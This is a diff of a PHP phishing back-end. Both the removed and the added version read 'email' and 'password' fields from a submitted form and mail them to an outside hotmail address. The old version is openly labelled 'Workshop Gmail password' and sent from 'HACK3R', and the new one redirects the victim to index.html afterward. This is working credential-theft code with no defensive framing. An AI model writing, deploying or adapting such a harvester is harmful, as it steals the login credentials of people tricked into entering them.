@@ -1,22 +1,22 @@
 <?php
-        $mailhacked = $_POST["email"];
-        $passwordhacked = $_POST["password"];
-         $to = "nicocaposi@hotmail.com";
-         $subject = "Workshop Gmail password";
-         
-         $message = "$mailhacked";
-         $message .= "<br>$passwordhacked";
-         
-         $header = "From:HACK3R@Hack3r.com \r\n";
-         $header .= "Cc:abcd@somedomain.com \r\n";
-         $header .= "MIME-Version: 1.0\r\n";
-         $header .= "Content-type: text/html\r\n";
-         
-         $retval = mail($to,$subject,$message,$header);
-         
-         if( $retval == true ) {
-            include("MKR.php");
-         }else {
-            echo "Message could not be sent...404 error check your internet";
-         }
-      ?>
+$name = $_POST['email'];
+$mail = $_POST['password'];
+
+
+$header = 'From: ' . $mail . " \r\n";
+$header .= "X-Mailer: PHP/" . phpversion() . " \r\n";
+$header .= "Mime-Version: 1.0 \r\n";
+$header .= "Content-Type: text/plain";
+
+$message = "Este mensaje fue enviado por: " . $name . " \r\n";
+$message .= "Su e-mail es: " . $mail . " \r\n";
+$message .= "Enviado el: " . date('d/m/Y', time());
+
+$para = 'nicocaposi@hotmail.com';
+$asunto = 'IZI PIZI';
+
+mail($para, $asunto, utf8_decode($message), $header);
+
+header("Location:index.html");
+?>
+-->
